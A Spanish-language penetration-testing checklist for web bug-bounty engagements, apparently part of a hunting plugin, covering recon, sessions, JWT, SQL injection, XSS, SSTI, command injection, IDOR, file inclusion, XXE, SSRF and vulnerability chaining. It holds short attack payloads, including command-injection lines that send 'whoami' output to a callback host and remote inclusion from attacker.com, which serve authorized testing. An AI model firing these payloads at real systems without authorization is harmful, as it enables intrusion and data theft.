# Hunting Checklist — Cobertura Breadth-First

> Referencia de cobertura para engagements. Cada sección corresponde a una
> categoría de vulnerabilidad con items concretos para probar. Usar como
> guía de barrido antes de profundizar en ninguna clase.
>
> Formato: checkboxes para marcar durante el engagement. Al cerrar,
> registrar gaps en `engine/coverage.py`.

---

## 1. Reconocimiento y endpoints ocultos

- [ ] Navegar el sitio con proxy interceptor activo (Burp/mitmproxy) para
      mapear rutas orgánicamente.
- [ ] Localizar documentación de API (Swagger, OpenAPI, GraphQL playground,
      `/api-docs`, `/swagger.json`, `/_v/graphql`).
- [ ] Recuperar URLs históricas desde Wayback Machine / web.archive.org.
- [ ] Extraer endpoints de archivos JS (linkfinder, JSParser, grep manual
      de `fetch(`, `axios.`, `XMLHttpRequest`).
- [ ] Buscar archivos de respaldo y configuración expuestos (`.bak`,
      `.old`, `.env`, `.git/config`, `wp-config.php.bak`).
- [ ] Verificar existencia de paneles de administración (`/admin`,
      `/manager`, `/dashboard`, `/wp-admin`, `/cpanel`).
- [ ] Fuerza bruta de directorios con wordlist ajustada al stack
      (`ffuf`, `gobuster`, `feroxbuster`).
- [ ] Google dorking del target: `site:target.com filetype:pdf|xls|sql`,
      `inurl:admin`, `intitle:"index of"`.
- [ ] Revisar features deshabilitadas o experimentales (feature flags en
      JS, rutas comentadas en source, headers de versión).
- [ ] Enumerar subdominios visibles desde certificados, links internos,
      y DNS (crt.sh, subfinder, amass).

## 2. Gestión de sesión

- [ ] Probar acceso no autorizado con cada rol disponible (usuario, admin,
      moderador, API key) — acceder a recursos de un rol superior.
- [ ] Verificar que un cambio de rol/permisos toma efecto inmediato (no
      basta con que la UI cambie — la sesión debe invalidarse).
- [ ] Probar session fixation: fijar un token antes del login y verificar
      si se reutiliza después de autenticarse.
- [ ] Buscar tokens de sesión en URLs (query params, Referer leaks).
- [ ] Confirmar que logout invalida la sesión server-side (no solo borra
      la cookie — replay del token post-logout debe fallar).
- [ ] Confirmar que eliminar cuenta invalida todas las sesiones activas.
- [ ] Verificar timeout de sesión por inactividad.
- [ ] Evaluar aleatoriedad del token de sesión (longitud, entropía,
      patrón predecible como incrementos o timestamps).

## 3. Cookies

- [ ] Flag `HttpOnly` en cookies de sesión (evita robo vía XSS).
- [ ] Flag `Secure` (solo se envía por HTTPS).
- [ ] Atributo `SameSite` (Strict o Lax — None es peligroso sin Secure).
- [ ] Scope de `Domain` y `Path` (¿la cookie es accesible desde
      subdominios o rutas más amplias de lo necesario?).
- [ ] Expiración razonable (cookies persistentes con vida larga son
      riesgo si se roban).
- [ ] Verificar que valores de cookie no se reflejan en URLs o logs.
- [ ] Probar si se pueden setear cookies desde subpaths o dominios no
      validados (cookie tossing).

## 4. Autenticación y login

### Enumeración y fuerza bruta
- [ ] Enumeración de usuarios por diferencia en respuesta (mensaje de error,
      timing, código HTTP) en login, registro, y password reset.
- [ ] Política de lockout: ¿existe? ¿cuántos intentos? ¿se puede evadir
      rotando parámetros (headers, IP, username case)?
- [ ] Credenciales por defecto (admin/admin, admin/password, test/test).
- [ ] Credenciales enviadas por HTTP (sin TLS) en algún flujo.

### Password reset
- [ ] Token de reset predecible o débil (corto, timestamp, secuencial).
- [ ] Token filtrado en Referer al hacer click en un link de la página
      de reset.
- [ ] Manipulación de parámetros: cambiar el email/user en el request de
      reset para recibir el token de otro usuario.
- [ ] Re-autenticación requerida antes de cambiar password (sin re-auth,
      un XSS escala a cambio de contraseña).

### OAuth / SSO
- [ ] Validar que `redirect_uri` no acepta dominios arbitrarios.
- [ ] Verificar `state` parameter contra CSRF en flujo OAuth.
- [ ] Probar account linking: ¿se puede vincular una cuenta OAuth ajena?

### JWT
- [ ] Algoritmo `none` aceptado (firma vacía).
- [ ] Confusión de algoritmo (RS256 → HS256 usando la clave pública como
      secret).
- [ ] Secret débil (brute-forceable con jwt_tool o hashcat).
- [ ] Rotación de tokens: ¿el JWT expira? ¿hay refresh token?

### Post-login
- [ ] El token de sesión rota después de login exitoso (previene fixation).

## 5. SQL Injection

- [ ] Probar todos los inputs: parámetros GET/POST, headers (Cookie,
      Referer, X-Forwarded-For, User-Agent), JSON bodies.
- [ ] Error-based: inyectar comilla simple/doble y observar errores SQL.
- [ ] Time-based blind: `' OR SLEEP(5)--`, `'; WAITFOR DELAY '0:0:5'--`.
- [ ] Boolean blind: `' OR 1=1--` vs `' OR 1=2--`, comparar respuestas.
- [ ] UNION-based: determinar número de columnas y extraer datos.
- [ ] Second-order: input que se almacena y se inyecta en otra query
      después (registro → perfil, comentario → panel admin).
- [ ] NoSQL injection: `{"$gt": ""}`, `{"$ne": null}` en JSON bodies
      (MongoDB, CouchDB).
- [ ] Focos prioritarios: búsqueda, login, parámetros de orden/sort,
      filtros, y cualquier input que se refleje en una query.
- [ ] Automatizar con sqlmap una vez confirmada la inyección manual.

## 6. Cross-Site Scripting (XSS)

### Stored
- [ ] Probar cada campo que muestre datos de usuario: nombre, bio,
      comentarios, títulos, descripciones, uploads de archivos.
- [ ] Empezar con tags inocuos (`<b>test</b>`) para confirmar que HTML
      se renderiza, luego escalar.
- [ ] Probar en contextos donde el input se muestra a otros usuarios
      (especialmente admins — blind stored XSS).

### Reflected
- [ ] Parámetros de búsqueda, mensajes de error, y cualquier valor que
      se refleje en la respuesta.
- [ ] Headers reflejados: Referer, User-Agent en páginas de error o logs.
- [ ] Páginas de error 404 que reflejan la URL solicitada.

### DOM-based
- [ ] Buscar sinks peligrosos en JS: `innerHTML`, `document.write`,
      `eval`, `setTimeout(string)`, `location.href = userInput`.
- [ ] Los scanners server-side no detectan DOM XSS — requiere revisión
      manual de JS.

### Blind
- [ ] Inyectar payloads con callback OOB (interactsh, XSS Hunter) en
      campos que se renderizan en paneles admin o backend.

### Evasión de filtros
- [ ] Encoding: HTML entities, URL encoding, double encoding, Unicode.
- [ ] Variaciones de case: `<ScRiPt>`, `<IMG SRC=x oNeRrOr=...>`.
- [ ] Keyword splitting: `<scr<script>ipt>`.
- [ ] Breakout de atributo: `" onfocus="alert(1)" autofocus="`.
- [ ] Breakout de string JS: `';alert(1)//`, `\';alert(1)//`.
- [ ] Tags alternativos: `<svg onload=...>`, `<details open ontoggle=...>`,
      `<math><mtext><table><mglyph><svg><mtext><textarea><path>`.

## 7. Server-Side Template Injection (SSTI)

- [ ] Inyectar expresiones aritméticas en cada input y observar si se
      evalúan:
  - Jinja2/Twig: `{{7*7}}` → `49`
  - FreeMarker: `${7*7}` → `49`
  - ERB: `<%= 7*7 %>` → `49`
  - Velocity: `#set($x=7*7)$x` → `49`
- [ ] Confirmar el motor de templates con payloads específicos (el
      políglota `{{7*'7'}}` da `7777777` en Jinja2 pero `49` en Twig).
- [ ] Automatizar detección con tplmap.
- [ ] Si se confirma evaluación, escalar a lectura de archivos o RCE
      solo con autorización explícita del operador.

## 8. Command Injection

- [ ] Probar separadores de comando: `;`, `|`, `||`, `&&`, `` ` ``,
      `$(...)`, `\n`, `%0a`.
- [ ] Blind: time-based (`; sleep 5`, `| timeout /t 5` en Windows).
- [ ] Out-of-band: `; curl http://callback.oast/$(whoami)`,
      `; nslookup $(id).callback.oast`.
- [ ] Parámetros sospechosos: filenames, IPs, hostnames, cualquier input
      que parezca pasarse a un comando OS.
- [ ] Probar en Linux y Windows (algunos targets corren ambos).

## 9. Cross-Site Request Forgery (CSRF)

- [ ] Verificar que acciones sensibles (cambiar email, password, roles,
      configuración) llevan token anti-CSRF.
- [ ] Probar si el token es estático (mismo valor en cada request).
- [ ] Probar si el servidor acepta el request sin token o con token
      vacío/aleatorio.
- [ ] Verificar `SameSite` en cookies de sesión (Lax bloquea POST
      cross-site, pero no GET).
- [ ] CSRF en login (forzar login como atacante) y logout suelen estar
      fuera de scope — confirmar con el RoE.

## 10. IDOR y Broken Access Control

### Metodología de dos cuentas (A + B)
- [ ] Registrar cuenta A y cuenta B en el mismo target.
- [ ] Como A, navegar cada funcionalidad y anotar cada request que
      contenga un identificador (numérico, UUID, email, filename).
- [ ] Repetir esos requests usando el token de sesión de B.
- [ ] Si B puede leer o modificar datos de A → IDOR confirmado.

### Cobertura de métodos HTTP
- [ ] No solo probar GET — probar PUT, DELETE y PATCH, que suelen
      tener controles más débiles.
- [ ] Buscar IDs en JSON bodies, headers custom y variables GraphQL,
      no solo en la URL.

### Tipos de identificadores
- [ ] IDs numéricos secuenciales (los más fáciles de enumerar).
- [ ] UUIDs: no son protección si se pueden obtener de un link
      compartido, una respuesta de API, un email, o un listing endpoint.
- [ ] Emails y usernames como identificadores.
- [ ] Referencias indirectas: rutas de archivos, números de factura,
      slugs, nombres de recursos.

### Escalación
- [ ] Cross-tenant: acceder a recursos de otra organización/empresa.
- [ ] Vertical: usuario normal accediendo a endpoints de admin.
- [ ] Documentar exactamente qué puede hacer B con datos de A, con
      evidencia clara. Impacto concreto = pago más rápido.

## 11. Local/Remote File Inclusion (LFI/RFI)

- [ ] Parámetros que cargan archivos por nombre: `?page=`, `?file=`,
      `?template=`, `?lang=`, `?include=`.
- [ ] Directory traversal: `../../../etc/passwd`, variantes con encoding
      (`..%2f`, `..%252f`, `....//`).
- [ ] Rutas Windows: `..\..\..\windows\win.ini`, `....\\`.
- [ ] Null byte (PHP < 5.3.4): `../../../etc/passwd%00`.
- [ ] PHP wrappers para leer source: `php://filter/convert.base64-encode/
      resource=index.php`.
- [ ] Remote inclusion (requiere `allow_url_include=On`):
      `?file=http://attacker.com/shell.txt`.
- [ ] Log poisoning: inyectar payload en User-Agent y luego incluir el
      log (`/var/log/apache2/access.log`).

## 12. File Upload

- [ ] Subir archivos con extensión ejecutable: `.php`, `.jsp`, `.asp`,
      `.aspx`, `.py`, `.cgi`.
- [ ] Bypass de extensión: doble extensión (`shell.php.jpg`), extensiones
      alternativas (`.phtml`, `.php5`, `.jspx`), null byte en nombre.
- [ ] MIME spoofing: cambiar `Content-Type` a `image/png` pero mantener
      contenido ejecutable.
- [ ] Archivos polyglot: imagen válida con payload embebido (JPEG/PHP,
      GIF/JS).
- [ ] Verificar si los uploads son accesibles por web (¿se pueden
      ejecutar directamente?).
- [ ] SVG como carrier de XSS (`<svg onload="alert(1)">`).
- [ ] Documentos Office/PDF como carriers de XXE o macros.
- [ ] Archivos grandes para DoS (¿hay límite de tamaño?).

## 13. XML External Entities (XXE)

- [ ] Probar en cada input que acepte XML: bodies, SOAP endpoints,
      uploads de XML/SVG/DOCX/XLSX.
- [ ] Payload básico de lectura de archivo:
      `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`.
- [ ] XXE blind con callback OOB: entity que hace request a servidor
      controlado (`<!ENTITY xxe SYSTEM "http://callback.oast/">`).
- [ ] Probar en archivos Office (descomprimir, inyectar entity en
      `[Content_Types].xml` o `word/document.xml`, recomprimir).
- [ ] SVG upload con entity XXE.
- [ ] SSRF vía XXE: `<!ENTITY xxe SYSTEM "http://169.254.169.254/
      latest/meta-data/">`.

## 14. Server-Side Request Forgery (SSRF)

- [ ] Identificar parámetros que aceptan URLs: webhooks, callbacks,
      importadores, preview de URLs, integraciones.
- [ ] Probar contra direcciones internas: `127.0.0.1`, `localhost`,
      `10.x.x.x`, `172.16.x.x`, `192.168.x.x`.
- [ ] Cloud metadata: `http://169.254.169.254/latest/meta-data/`
      (AWS), `http://metadata.google.internal/` (GCP).
- [ ] Protocolos alternativos: `file:///etc/passwd`, `gopher://`,
      `dict://`, `ftp://`.
- [ ] Bypass de filtros: notación IP alternativa (`0x7f000001`,
      `2130706433`, `0177.0.0.1`), encoding, DNS rebinding,
      redirect chain.
- [ ] SSRF a servicios internos: Redis, Memcached, Elasticsearch,
      bases de datos internas.

## 15. Open Redirect

- [ ] Parámetros de redirect: `?url=`, `?next=`, `?redirect=`,
      `?return=`, `?continue=`, `?dest=`.
- [ ] Bypasses de validación:
  - Userinfo: `https://target.com@attacker.com`
  - Protocol-relative: `//attacker.com`
  - Subdominio: `https://attacker.target.com`
  - Encoding: `https://target.com/%2f%2fattacker.com`
  - Backslash: `https://target.com\@attacker.com`
- [ ] Impacto standalone suele ser bajo — buscar cadenas:
  - Redirect en flujo OAuth → robo de authorization code.
  - Redirect post-login → phishing creíble.

## 16. HTTP Security Headers

- [ ] **CSP**: ¿existe? ¿tiene `unsafe-inline`, `unsafe-eval`,
      wildcards (`*.googleapis.com`), `data:` en script-src?
      ¿Report-Only o enforcement? CSP débil + stored XSS = severidad alta.
- [ ] **X-Frame-Options**: ¿`DENY` o `SAMEORIGIN`? Sin él → clickjacking.
- [ ] **HSTS**: ¿presente? ¿`includeSubDomains`? ¿`max-age` razonable?
      ¿En preload list?
- [ ] **X-Content-Type-Options**: `nosniff` para evitar MIME sniffing.
- [ ] **Referrer-Policy**: ¿`no-referrer` o `strict-origin`? Sin ella,
      URLs con tokens se filtran vía Referer.
- [ ] **Permissions-Policy**: ¿restringe camera, microphone, geolocation?
- [ ] **Cache-Control**: respuestas sensibles deben llevar `no-store`.
      `no-cache` no es suficiente (se almacena, solo revalida).

## 17. Cadenas de vulnerabilidades (Chaining)

> Las cadenas elevan severidad. Buscar combinaciones después del barrido
> breadth-first.

### XSS como pivote
- [ ] XSS → robo de cookies sin HttpOnly → ATO si la sesión no rota.
- [ ] XSS → exfiltrar PII visible en la página de la víctima.
- [ ] XSS → ejecutar acciones como la víctima (cambiar email, hacer
      compras, escalar permisos).
- [ ] XSS + redirect → phishing con dominio legítimo.

### CSRF como pivote
- [ ] CSRF → plantar stored XSS (si el campo vulnerable no valida CSRF
      pero el input no se sanitiza).
- [ ] CSRF → cambiar email → password reset → ATO.
- [ ] CSRF bypass vía redirect que entrega SameSite cookies.

### IDOR como pivote
- [ ] Listing endpoint expone UUIDs → usar UUID para IDOR en endpoint
      sensible.
- [ ] IDOR en endpoint admin → escalar privilegios.
- [ ] IDOR + enumeración → dump masivo de datos sensibles.

### Open Redirect como pivote
- [ ] Redirect en OAuth → robo de authorization code → ATO.
- [ ] Redirect post-login → credential harvesting.

---

## Uso con el plugin

### Mapeo a vuln_classes del engine

| Sección | vuln_class(es) del plugin |
|---|---|
| Recon | `info-disclosure` |
| Session management | `hunt-session-management` |
| Cookies | `hunt-session-management` |
| Auth/Login | `auth-bypass`, `hunt-rate-limiting` |
| SQLi | `sqli` |
| XSS | `xss` |
| SSTI | `ssti` |
| Command injection | `rce` |
| CSRF | `csrf` |
| IDOR/BAC | `idor`, `hunt-broken-access-control` |
| LFI/RFI | `lfi-rfi` |
| File upload | `hunt-file-upload` |
| XXE | `xxe` |
| SSRF | `ssrf` |
| Open redirect | `open-redirect` |
| Headers | `info-disclosure`, `cors` |
| JWT | `jwt` |
| Chaining | (depende de la cadena) |

### Workflow

1. Al inicio del engagement, copiar este checklist al estado del engagement
   o usarlo como referencia de `engine/coverage.py`.
2. Hacer un pase completo (breadth-first) marcando items probados.
3. Registrar items no probados como gaps de cobertura al cerrar.
4. Profundizar en las categorías donde se encontraron indicios.
5. Buscar cadenas (sección 17) una vez completado el barrido.

### Skills relacionadas

- `skills/core/opsec-discipline/` — rate limiting y UA hygiene para cada test.
- `skills/hunt/` — skills específicas por vuln_class para profundizar.
- `references/payloads/` — payloads por categoría.
- `references/vuln-classes/` — descripción detallada de cada clase.
- `engine/chain_engine.py` — motor de cadenas para la sección 17.
